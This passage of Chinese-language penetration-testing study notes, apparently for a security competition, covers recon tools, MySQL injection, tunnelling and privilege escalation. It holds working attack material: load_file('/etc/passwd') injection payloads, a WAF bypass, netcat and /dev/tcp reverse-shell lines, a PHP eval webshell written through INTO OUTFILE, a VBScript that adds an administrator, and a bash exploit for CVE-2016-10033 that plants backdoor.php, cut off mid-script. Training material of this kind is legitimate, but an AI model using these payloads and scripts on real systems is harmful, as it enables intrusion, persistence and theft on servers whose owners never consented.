指定输出的文件</li>\n<li>-wordlist 指定字典文件</li>\n</ul>\n<h2 id=\"dmitry\"><a class=\"anchor\" href=\"#dmitry\">#</a> Dmitry</h2>\n<ul>\n<li><code>dmitry [-winsepfb][-t 0-9] [-0 host.txt] host</code> -w whois 查询，通过域名查地址 i 参数正好相反</li>\n<li>-n 从 <span class=\"exturl\" data-url=\"aHR0cDovL25ldGNyYWZ0LmNvbQ==\">netcraft.com</span> 获取主机信息</li>\n<li>-s 查询子域名 (需要能够访问 google)</li>\n<li>-e 查询邮件地址</li>\n<li>-p 进行 tcp 端口扫描</li>\n<li>-t 指定端口扫描超时时间 (默认为 2s)</li>\n<li>-o 指定输出文件</li>\n<li>关于域名查询，也可以直接访问站长工具进行在线查询</li>\n</ul>\n<h2 id=\"recon-ng\"><a class=\"anchor\" href=\"#recon-ng\">#</a> Recon-ng</h2>\n<ul>\n<li>\n<p>是由 Python 编写的一个开源的 Web 侦查 (信息收集) 框架。</p>\n</li>\n<li>\n<p>4.9.2 版本， 支持 77 个侦查模块，8 个报告模块，2 个导入模块，2 个攻击模块，2 个发现模拟。</p>\n</li>\n<li>\n<p>search 模块</p>\n</li>\n<li>\n<p>use 模块</p>\n</li>\n<li>\n<p>showinfo 查看可设置的参数</p>\n</li>\n<li>\n<p>set 设置某项参数</p>\n</li>\n<li>\n<p>run</p>\n</li>\n<li>\n<p>Profiler 模块 interesting_ files 模块 shodan</p>\n</li>\n<li>\n<p>Workspaces 创建工作区 select 选择某个工作区</p>\n</li>\n<li>\n<p>Add hosts/netblocks/domains 在工作区下增加一些参数，适用于所有模块</p>\n</li>\n<li>\n<p>Set nameserver 在工作区下设置域名服务器，适用于所有模块</p>\n</li>\n<li>\n<p>Show hosts/netblocks/domain/ports 查看设置信息及获取信息</p>\n</li>\n<li>\n<p>search interesting_files 查找敏感信息</p>\n</li>\n<li>\n<p>search profiler 查找某个账号在知名网站的注册情况</p>\n</li>\n<li>\n<p>show profilers</p>\n</li>\n<li>\n<p>search shodan_hostname 查找某个域名相关的所有主机及其开放的端口信息</p>\n</li>\n<li>\n<p>先要设置 <code>key</code> ， <code>keys add shodan_api xxxxx</code></p>\n<p><code>show keys</code> , 可以看到设置的 key 值</p>\n<p><code>show ports</code>  展示信息</p>\n</li>\n<li>\n<p>输出信息 <code>use report</code></p>\n<p>report 形式， <code>search report</code></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng.jpg\" alt=\"\"></p>\n<p><code>show info</code></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng_1.jpg\" alt=\"\"></p>\n<p><code>set TABLE xxx</code>  设置格式</p>\n<p>之后  <code>run</code>  执行</p>\n</li>\n</ul>\n<h1 id=\"27-sql-注入\"><a class=\"anchor\" href=\"#27-sql-注入\">#</a> 2.7 SQL 注入</h1>\n<h2 id=\"mysql-的四种注释风格\"><a class=\"anchor\" href=\"#mysql-的四种注释风格\">#</a> mysql 的四种注释风格</h2>\n<ol>\n<li><code>#</code></li>\n<li><code>--</code></li>\n<li><code>/*...*/</code></li>\n<li><code>/*!...*/</code>  (内联注释)  <code>/*!50000*/</code>  (mysql 版本大于 50000 执行)</li>\n</ol>\n<h2 id=\"mysql-中常用的函数\"><a class=\"anchor\" href=\"#mysql-中常用的函数\">#</a> mysql 中常用的函数</h2>\n<ol>\n<li>\n<p><code>system__user()</code>  系统用户名</p>\n</li>\n<li>\n<p><code>user()</code>  用户名</p>\n</li>\n<li>\n<p><code>current user()</code>  当前用户名</p>\n</li>\n<li>\n<p><code>session_user()</code>  连接 $ 据库的用户名</p>\n</li>\n<li>\n<p><code>database()</code>  数据库名</p>\n</li>\n<li>\n<p><code>version()</code>  MYSQL 数 据库版本</p>\n</li>\n<li>\n<p><code>load_file()</code>  MYSQL 读取本地文件的函数</p>\n<p>操作前提:</p>\n<ul>\n<li>知道文件绝对路径</li>\n<li>能够使用 union 查询</li>\n<li>对 web 目录有写权限</li>\n</ul>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">' /etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token comment\"># .</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D://phpStudy//WWW//nvhack.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token number\">0x27443A2F2F70687053747564792F2F5757572F2F6E766861636B2E706870</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p><code>@@datadir</code>  读取数据库路径</p>\n</li>\n<li>\n<p><code>@@basedir</code> MYSQL 安装路径</p>\n</li>\n<li>\n<p><code>@@version_compile_os</code>  操作系统 Windows Server 2003</p>\n</li>\n<li>\n<p><code>into_outfile() / into outfile()</code></p>\n<ul>\n<li>前提:\n<ul>\n<li>文件名必须全路径 (绝对路径)，</li>\n<li>用户必须有写文件的权限</li>\n<li>没有对 ' 单引号过滤</li>\n</ul>\n</li>\n<li><code>SELECT'' into outfile 'D://phpStudy//WWW//hack.php'</code></li>\n</ul>\n</li>\n<li>\n<p><code>concat(str1,str2,...)</code></p>\n<p><code>concat_ws(separator,str1,str2,...)</code></p>\n<ul>\n<li>表示 concat with separator，即有分隔符的字符串连接，和 concat 类似，但可以直接确定字符串连接的分隔符 如 <code>concat_ws (0x23,\"test1\",\"test2\",\"test3\"), 得到 \"test1#test2#test3\"</code></li>\n</ul>\n<p>group_concat()</p>\n</li>\n</ol>\n<h2 id=\"使用内联注释绕过安全狗\"><a class=\"anchor\" href=\"#使用内联注释绕过安全狗\">#</a> 使用内联注释绕过安全狗</h2>\n<p>如 <code>?id=1 union select 1,2,3,4,5</code>  这样会被拦截</p>\n<p>将其改为 <code>?id=1 /*!50001union*/ /*!50001select*/ 1,2,3,4,5</code></p>\n<p>如果使用 <code>and</code> ，可将 <code>and</code>  修改为 <code>&amp;&amp;</code> ，即 <code>%26%26</code></p>\n<h1 id=\"28-内网转发基础\"><a class=\"anchor\" href=\"#28-内网转发基础\">#</a> 2.8 内网转发基础</h1>\n<p>使用 Socks 协议，由于不支持 SMT</p>\n<p>在 nmap 扫描时，需要有参数  <code>-Pn -sT</code></p>\n<h2 id=\"正向代理和反向代理\"><a class=\"anchor\" href=\"#正向代理和反向代理\">#</a> 正向代理和反向代理</h2>\n<p>** 正向代理：** 客户端主动向代理发送一个请求，然后代理向服务器转交请求并将获取的内容返回给客户端</p>\n<p>** 反向代理：** 一般是代理服务器主动将获取的资源流量转发到客户端，让客户端接收</p>\n<h2 id=\"netcatnc\"><a class=\"anchor\" href=\"#netcatnc\">#</a> NetCat/nc</h2>\n<h3 id=\"用法参数-简略\"><a class=\"anchor\" href=\"#用法参数-简略\">#</a> 用法参数 (简略)</h3>\n<p>-l 开启监听 -p 指定端口 -t 以 telnet 形式应答 -e 程序重定向</p>\n<p>-n 以数字形式表示 -vv 显示详细信息</p>\n<p><code>nc -v ip port</code>  探测 port 端口是否打开</p>\n<p><code>nc -vv ip port &lt; file_path</code>  提交指定文件内的数据包到 ip 的 port 端口</p>\n<h3 id=\"正向代理\"><a class=\"anchor\" href=\"#正向代理\">#</a> 正向代理</h3>\n<p><strong>代理端：</strong> <code>nc -l -p 111 -t -e cmd.exe</code></p>\n<p><strong>客户端</strong>： <code>nc -nvv ip port(111)</code></p>\n<h3 id=\"反向代理\"><a class=\"anchor\" href=\"#反向代理\">#</a> 反向代理</h3>\n<p><strong>客户端</strong>：  <code>nc -lvnp port</code></p>\n<p><strong>代理端：</strong>  <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>\n<h2 id=\"常用内网转发工具\"><a class=\"anchor\" href=\"#常用内网转发工具\">#</a> 常用内网转发工具</h2>\n<h3 id=\"netsh\"><a class=\"anchor\" href=\"#netsh\">#</a> netsh</h3>\n<p>netsh 是 Windows 自带的命令行脚本工具，它允许从本地或远程显示或修改当前正在运行的计算机的网络配置，它基于 Socket 协议，</p>\n<p>我们可以利用 netsh 进行端口转发</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>netsh interface portproxy add v4tov4 listenaddress = 客户端 ip (转发) listenport=666 (转发到的端口) connectaddress = 要转发的 ip (内网) connectport = 转发端口</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>查看转发</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>netsh interface portproxy show all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>删除</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port</pre></td></tr></tbody></table></figure><h3 id=\"lcx\"><a class=\"anchor\" href=\"#lcx\">#</a> Lcx</h3>\n<h4 id=\"正向转发\"><a class=\"anchor\" href=\"#正向转发\">#</a> 正向转发</h4>\n<p><code>lcx -tran port1 ip port2</code></p>\n<p>即将 ip 的端口 port2 转发到本机的端口 port1 上</p>\n<h4 id=\"反向转发\"><a class=\"anchor\" href=\"#反向转发\">#</a> 反向转发</h4>\n<p>** 代理端：**lcx -slave 转发到的 ip 转发到的端口 port 转发 ip 转发端口</p>\n<p><strong>本地</strong>：lcx listen 666 777</p>\n<p>将 666 端口接收到的流量转 777 端口</p>\n<p>本地访问 127.0.0.1:777（或者转为转发到的 ip）</p>\n<p>转 777 端口的原因：666 端口已经用来接收流量，不能访问，因此需要再转</p>\n<h3 id=\"ssock\"><a class=\"anchor\" href=\"#ssock\">#</a> sSock</h3>\n<h4 id=\"proxychains\"><a class=\"anchor\" href=\"#proxychains\">#</a> proxychains</h4>\n<p>Linux 下的代理工具，可以使任何程序通过代理上网 <code>/etc/proxychains.conf</code></p>\n<p>Windows 下可以用 Proxifier</p>\n<h4 id=\"sockscap64\"><a class=\"anchor\" href=\"#sockscap64\">#</a> sockscap64</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29ja3NjYXA2NC5jb20vemgtaGFucy9ob21lcGFnZS8=\">https://www.sockscap64.com/zh-hans/homepage/</span></p>\n<p>使用</p>\n<p><strong>客户端:</strong>  <code>./rcsocks -l 9999 -p 1080 -vv (9999 为本地提供服务 (访问) 端口)</code></p>\n<p><strong>代理端:</strong>  <code>./rssocks -vv -s 客户端 ip:1080</code></p>\n<h3 id=\"ew\"><a class=\"anchor\" href=\"#ew\">#</a> EW</h3>\n<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向”、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、 Windows.MacOS、Arm-Linux 均被包括其内，强烈推荐使用</p>\n<p><strong>Ew 正向代理</strong></p>\n<p>代理端（中间机，可以访问内网机器）:・ew.exe -S ssocksd -l 1080・</p>\n<p>客户端：设置代理服务器 IP，端口 1080</p>\n<p><strong>Ew 反向代理</strong></p>\n<ul>\n<li>\n<p>首先在攻击机执行命令:</p>\n<p><code>ew.exe -s rcsocks -| 888 -e 777</code></p>\n<p>意思是将物理机 888 端口的流量都转到本地端口 777_上。</p>\n</li>\n<li>\n<p>接着在在中间机（可以访问内网）中执行:</p>\n<p><code>ew.exe -s rssocks -d 192.168.11.248 (攻击机 ip) -e 777</code></p>\n<p>意思是将目标机的流量全部转到 192.168.11.248:777 端口</p>\n</li>\n<li>\n<p>最后在 sockscap64 中设置代理 127.0.0.1:888 端口即可 / 或者 proxychains 修改 proxychains.conf 配置文件</p>\n</li>\n</ul>\n<h3 id=\"regeorg\"><a class=\"anchor\" href=\"#regeorg\">#</a> reGeorg</h3>\n<p>web 代理工具</p>\n<p>基于 python，利用 PHP 创建的代理</p>\n<p>用于端口映射环境，流量只通过 http 传输</p>\n<ul>\n<li>\n<p>我们首先将 reGeorg 文件夹上传至肉鸡的网站目录下，然后访问对应脚本。</p>\n</li>\n<li>\n<p>192.1 68.20.128/r/tunnel.nosocket.php (或者也可以使用 tunnel.php)</p>\n</li>\n<li>\n<p>显示 Georg says, All seems fine 字样则代表成功。</p>\n</li>\n<li>\n<p>注意，工具目录下有各种脚本，网站是什么脚本，则访问对应脚本类型</p>\n</li>\n<li>\n<p>接下来在攻击机执行如下脚本 (需要 urlib3 模块) :</p>\n<p><code>python reGeorgSocksProxy.py -p 8888 -u http://192.168 .20.128/r/tunnel.nosocket.php</code></p>\n</li>\n<li>\n<p>最后设置 proxifier 代理为 127.0.0.1:8888，即可。</p>\n</li>\n</ul>\n<h1 id=\"29-综合渗透之溢出提权\"><a class=\"anchor\" href=\"#29-综合渗透之溢出提权\">#</a> 2.9 综合渗透之溢出提权</h1>\n<h2 id=\"写木马获取-webshell\"><a class=\"anchor\" href=\"#写木马获取-webshell\">#</a> 写木马获取 webshell</h2>\n<p>通过弱密码登陆 phpadmin，利用 <code>into outfile \"\"</code>  写一句话木马</p>\n<p>(或者创建表写入一句话木马)</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>mysql<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">.</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon1<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">TEXT</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>mysql<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">.</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>darkmoon (<span class=\"token punctuation\">`</span></span>darkmoon1<span class=\"token identifier\"><span class=\"token punctuation\">`</span>) VALUES ('&lt;?php @eval($_POST[pass]);?&gt;');</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>SELECT <span class=\"token punctuation\">`</span>darkmoon1<span class=\"token identifier\"><span class=\"token punctuation\">`</span> FROM <span class=\"token punctuation\">`</span></span>darkmoon<span class=\"token identifier\"><span class=\"token punctuation\">`</span> INTO OUTFILE 'd:/phps tudy/www/test.php' ;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>DROP TABLE IF EXISTS <span class=\"token punctuation\">`</span>darkmoon<span class=\"token punctuation\">`</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">Create</span> <span class=\"token keyword\">TABLE</span> moon <span class=\"token punctuation\">(</span>darkmoon <span class=\"token keyword\">text</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">Insert</span> <span class=\"token keyword\">INTO</span> moon <span class=\"token punctuation\">(</span>darkmoon<span class=\"token punctuation\">)</span> <span class=\"token keyword\">VALUES</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?php @eval($_POST[pass]);?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">select</span> darkmoon <span class=\"token keyword\">from</span> moon <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'d:/phpstudy/www/test.php'</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">Drop</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token keyword\">EXISTS</span> moon<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"利用脚本添加用户\"><a class=\"anchor\" href=\"#利用脚本添加用户\">#</a> 利用脚本添加用户</h2>\n<p>写入成功获取到 webshell 后，</p>\n<p>目的是登录目标服务器，所以需要获取当前用户密码或者添加账户</p>\n<p>这里的想法是尝试给目标服务器的启动目录写一个脚本，然后设法使其重启，运行脚本，获得权限</p>\n<p>user.vbs</p>\n<pre><code class=\"language-vbscript\">set wsnetwork=Create0bject (\"WSCRIPT.NEIWORK\")\nos=\"WinNT://\"&amp;wsnetwork.ComputerName\nSet ob=Get0bject(os)' 得到adsi接口,绑定\nSet oe=Get0bject(os&amp;\"/Administrators,group\")'属性, admin组\nSet od=ob.Create(\"user\", \"test\")'建立用户\nod.SetPassword 123456+abc*\" '设置密码\nod.SetInfo'保存\nSet of=Get0bject(os&amp;\"/test\" , user)'得到用户\noe.add os&amp;\"/test\"\n</code></pre>\n<p>先将该文件上传到网站的根目录 (这里为 <code>d:\\\\phpStudy\\\\WWW</code> ), 然后利用数据库的 root 权限侠士写文件到启动目录下</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:\\\\phpStudy\\\\WWW\\\\user.vbs'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'c:/docume~1/alluse~1/「开始」菜单/程序/启动/user.vbs'</span></pre></td></tr></tbody></table></figure><p>之后利用漏洞 MS12-020 使其蓝屏自动重启 (可使用 nessus 扫描漏洞)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\">exp 的下载</span></p>\n<h1 id=\"210-铁三真题解析之企业赛真题解析\"><a class=\"anchor\" href=\"#210-铁三真题解析之企业赛真题解析\">#</a> 2.10 铁三真题解析之企业赛真题解析</h1>\n<h2 id=\"wordpress\"><a class=\"anchor\" href=\"#wordpress\">#</a> wordpress</h2>\n<h3 id=\"wp-hide-security-enhancer-文件下载\"><a class=\"anchor\" href=\"#wp-hide-security-enhancer-文件下载\">#</a> WP Hide Security Enhancer 文件下载</h3>\n<p>Hide Security Enhancer 作为防护 WP Scan 的插件，有着查看文件的漏洞，只能查看，不能获取 webshell</p>\n<p><strong>Poc：</strong> <code>/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&amp;file_path=/wp-config.php</code>  其中 <code>wp-config.php</code>  可以输入任意文件来读取下载</p>\n<h3 id=\"wp-mailer-命令执行\"><a class=\"anchor\" href=\"#wp-mailer-命令执行\">#</a> WP mailer 命令执行</h3>\n<ul>\n<li>\n<p>CVE-2016-1033 RCE 漏洞</p>\n</li>\n<li>\n<p>影响 wordpress4.6 版本 =&gt; pgpmailer 5.2.14</p>\n</li>\n<li>\n<p>phpmailer &lt; 5.2.18 RCE AVE-2016-10033</p>\n</li>\n<li>\n<p>环境 Ubuntu exim4</p>\n</li>\n<li>\n<p>原理</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 在源代码中</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sitename</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$from_email</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'wordpress@'</span><span class=\"token operator\">.</span><span class=\"token variable\">$sitename</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$phpmailer</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setFrom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from_email</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$from_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>$_SERVER ['SERVER_NAME']</code>  来自包中的 Host，也就是说 <code>from_email</code>  可控</p>\n</li>\n<li>\n<p>命令注入</p>\n<ul>\n<li>\n<p>phpmailer 最后调用了 sendmail</p>\n</li>\n<li>\n<p>在服务器上生成</p>\n</li>\n<li>\n<p><code>/usr/bin/sendmail -t -i -fwordpress@inject</code></p>\n</li>\n<li>\n<p>利用 comment 绕过对空格的过滤 (RFC822)</p>\n<ul>\n<li>\n<p>如：</p>\n<p>HOST:inject(tmp1 inject tmp2)</p>\n<p><code>/usr/bin/sendmail -t -i -fwordwordpress@inject(tmp1 inject tmp2)</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>获得 sendmail 的命令注入后。通常情况下</p>\n<p>-O QueueDirectory=/tmp/ -X/var/www/html/backdoor.php</p>\n<p>-X 指定写的 log 文件，造成任意文件写入，写 webshell</p>\n<p>但由于源代码中有 strtolower 函数，全部转为小写，因此该方式不能利用</p>\n<p>所以在 exim4 直接命令执行</p>\n<ul>\n<li>\n<p><code>sendmail -be '${run}{/bin/true}{true}{false}'</code></p>\n</li>\n<li>\n<p>不需要猜测网站路径直接执行命令进行写文件</p>\n</li>\n<li>\n<p>但由于没有继承系统环境变量，执行命令需要绝对路径</p>\n</li>\n<li>\n<p>在上面中，由于需要绝对路径，那么必须要用到 /</p>\n</li>\n<li>\n<p>这里利用 exim4 的变量绕过斜杠和空格限制</p>\n</li>\n<li>\n<p><code>sendmail -be '${spool_directory}'</code> = &gt; /var/spool/exim4</p>\n</li>\n<li>\n<p><code>sendmail -be '{tod_log}'</code>  = &gt; 返回本地时间如 <code>2022-08-30 20:39:40</code></p>\n</li>\n<li>\n<p>字符串切割 '/' = &gt;  <code>{substr{0}{1}{spool_directory}}</code></p>\n</li>\n<li>\n<p>字符串切割 ' ' = &gt;  <code>{substr{10}{1}{tod_log}}</code></p>\n</li>\n<li>\n<p>最终需要执行的命令为</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sendmail</span> <span class=\"token parameter variable\">-be</span> <span class=\"token string\">'${run{/bin/touch /tmp/test}'</span> <span class=\"token comment\">#在 tmp 创建 test 文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sendmail</span> <span class=\"token parameter variable\">-be</span> <span class=\"token string\">'${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test}'</span></pre></td></tr></tbody></table></figure></li>\n<li>\n<p>漏洞触发点 (/wp-admin,lost password 选项，，输入 email 点击后会执行 sendmail)</p>\n</li>\n</ul>\n</li>\n<li>\n<p>漏洞 poc</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>#!/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre># CVE-2016-10033 exploit by opsxcq</pre></td></tr><tr><td data-num=\"3\"></td><td><pre># https://github.com/opsxcq/exploit-CVE-2016-10033</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>echo '[+] CVE-2016-10033 exploit by opsxcq'</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>if [ -z \"$1\" ]</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    echo '[-] Please inform an host as parameter'</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>if [ $(uname) == 'Darwin' ]</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    decoder='base64 -D'</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elif [ $(uname) == 'Linux' ]</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    decoder='base64 -d'  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    echo '[-] Your platform isnt supported: '$(uname)</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>host=$1</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>echo '[+] Exploiting '$host</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\nsubmit\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"name\"\\r\\n\\r\\n&lt;?php echo \"|\".base64_encode(system(base64_decode($_GET[\"cmd\"]))).\"|\"; ?&gt;\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"email\"\\r\\n\\r\\n\\\"vulnerables\\\\\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\\\" @test.com\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"message\"\\r\\n\\r\\nPwned\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\\r\\n' &gt;/dev/null &amp;&amp; echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>echo '[+] Checking if the backdoor was created on target system'</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\\n' \"http://$host/backdoor.php\")</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>if [ \"$code\" != \"200\" ]</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>then</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    echo '[-] Target cant be exploited'</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    exit -1</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    echo '[+] Backdoor.php found on remote system'</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>fi</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>cmd='whoami'</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>while [ \"$cmd\" != 'exit' ]</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>do</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    echo '[+] Running '$cmd</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) 